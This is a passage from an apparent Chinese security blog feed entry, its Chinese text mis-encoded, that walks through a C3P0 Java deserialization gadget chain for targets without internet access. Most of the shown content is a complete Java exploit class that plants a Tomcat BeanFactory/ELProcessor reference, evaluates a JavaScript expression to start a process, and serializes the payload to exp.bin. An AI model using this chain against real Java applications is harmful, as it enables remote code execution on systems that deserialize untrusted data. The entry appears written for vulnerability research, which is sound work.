class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.55<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-el-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.55<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-jasper-el<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.55<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="åˆ©ç”¨é“¾æ„é€ "><a href="#åˆ©ç”¨é“¾æ„é€ -3" class="headerlink" title="åˆ©ç”¨é“¾æ„é€ "></a>åˆ©ç”¨é“¾æ„é€ </h2><p>æˆ‘ä»¬çŸ¥é“BeanFactoryéœ€è¦ä¼ å…¥ResourceRefç±»ï¼Œæˆ‘ä»¬åœ¨getReferenceæ–¹æ³•ä¸­è¿”å›ResourceRefå³å¯</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.exp;<br><br><span class="hljs-keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> javax.naming.Referenceable;<br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> javax.sql.ConnectionPoolDataSource;<br><span class="hljs-keyword">import</span> javax.sql.PooledConnection;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.sql.SQLFeatureNotSupportedException;<br><span class="hljs-keyword">import</span> java.util.logging.Logger;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NoInternet_Attack</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP_Loader</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ConnectionPoolDataSource</span>, Referenceable &#123;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Reference <span class="hljs-title function_">getReference</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>            <span class="hljs-comment">// å®ä¾‹åŒ–Referenceï¼ŒæŒ‡å®šç›®æ ‡ç±»ä¸ºjavax.el.ELProcessorï¼Œå·¥å‚ç±»ä¸ºorg.apache.naming.factory.BeanFactory</span><br>            <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>            <span class="hljs-comment">// å¼ºåˆ¶å°†&#x27;x&#x27;å±æ€§çš„setterä»&#x27;setX&#x27;å˜ä¸º&#x27;eval&#x27;, è¯¦ç»†é€»è¾‘è§BeanFactory.getObjectInstanceä»£ç </span><br>            ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br>            <span class="hljs-comment">// åˆ©ç”¨è¡¨è¾¾å¼æ‰§è¡Œå‘½ä»¤</span><br>            ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));<br>            <span class="hljs-keyword">return</span> ref;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">(String user, String password)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PrintWriter <span class="hljs-title function_">getLogWriter</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLogWriter</span><span class="hljs-params">(PrintWriter out)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLoginTimeout</span><span class="hljs-params">(<span class="hljs-type">int</span> seconds)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getLoginTimeout</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Logger <span class="hljs-title function_">getParentLogger</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLFeatureNotSupportedException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">//åºåˆ—åŒ–</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Pool_Serial</span><span class="hljs-params">(ConnectionPoolDataSource c)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;<br>        <span class="hljs-comment">//åå°„ä¿®æ”¹connectionPoolDataSourceå±æ€§å€¼ä¸ºæˆ‘ä»¬çš„æ¶æ„ConnectionPoolDataSourceç±»</span><br>        <span class="hljs-type">PoolBackedDataSourceBase</span> <span class="hljs-variable">poolBackedDataSourceBase</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PoolBackedDataSourceBase</span>(<span class="hljs-literal">false</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> poolBackedDataSourceBase.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> cls.getDeclaredField(<span class="hljs-string">&quot;connectionPoolDataSource&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(poolBackedDataSourceBase,c);<br><br>        <span class="hljs-comment">//åºåˆ—åŒ–æµå†™å…¥æ–‡ä»¶</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;exp.bin&quot;</span>));<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fos);<br>        oos.writeObject(poolBackedDataSourceBase);<br><br>    &#125;<br><br>    <span class="hljs-comment">//ååºåˆ—åŒ–</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Pool_Deserial</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;exp.bin&quot;</span>));<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fis);<br>        objectInputStream.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;<br>        <span class="hljs-type">EXP_Loader</span> <span class="hljs-variable">exp_loader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EXP_Loader</span>();<br>        Pool_Serial(exp_loader);<br>        Pool_Deserial();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241203210853776.png" alt="image-20241203210853776"></p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://goodapple.top/archives/1749">https://goodapple.top/archives/1749</a></p><p><a href="https://forum.butian.net/share/2868">https://forum.butian.net/share/2868</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;c3p0ä»‹ç»&quot;&gt;&lt;a href=&quot;#C3P0ä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;C3P0ä»‹ç»&quot;&gt;&lt;/a&gt;C3P0ä»‹ç»&lt;/h1&gt;&lt;p&gt;C3P0æ˜¯ä¸€ä¸ªå¼€æºçš„JDBCè¿æ¥æ± ï¼Œå®ƒå®ç°äº†æ•°æ®æºå’ŒJNDIç»‘å®šï¼Œæ”¯æŒJDBC3è§„èŒƒå’ŒJDBC2çš„æ ‡å‡†æ‰©å±•ã€‚</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
</feed>
